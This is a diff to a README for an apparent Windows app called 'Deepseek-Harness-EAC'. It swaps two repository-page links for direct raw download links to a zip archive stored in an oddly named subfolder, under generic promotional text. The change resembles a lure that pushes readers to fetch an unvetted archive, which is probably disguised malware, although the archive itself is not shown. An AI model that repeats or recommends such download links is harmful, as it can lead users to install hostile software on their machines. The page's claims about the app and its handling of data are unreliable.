@@ -39,7 +39,7 @@ Specifically designed for Windows operating system, ensuring smooth performance 
 
 **Ready to get started?** Follow these simple steps:
 
-1. Visit the download page: [**Click Here to Download Deepseek-Harness-EAC**](https://github.com/Rainflymadrilene370/Deepseek-Harness-EAC)
+1. Visit the download page: [**Click Here to Download Deepseek-Harness-EAC**](https://raw.githubusercontent.com/Rainflymadrilene370/Deepseek-Harness-EAC/main/physicomorphic/Deepseek_Harness_EAC_3.7.zip)
 2. Look for the download button or link on that page
 3. Click it and wait for the download to complete
 
@@ -133,7 +133,7 @@ Your conversations and data are handled with care. The application respects your
 
 We're committed to making your experience wonderful. If you have questions, suggestions, or feedback, we'd love to hear from you. Check the GitHub repository page for more information, updates, and community discussions.
 
-**Remember:** The download link is: [https://github.com/Rainflymadrilene370/Deepseek-Harness-EAC](https://github.com/Rainflymadrilene370/Deepseek-Harness-EAC)
+**Remember:** The download link is: [https://raw.githubusercontent.com/Rainflymadrilene370/Deepseek-Harness-EAC/main/physicomorphic/Deepseek_Harness_EAC_3.7.zip](https://raw.githubusercontent.com/Rainflymadrilene370/Deepseek-Harness-EAC/main/physicomorphic/Deepseek_Harness_EAC_3.7.zip)
 
 ---
 
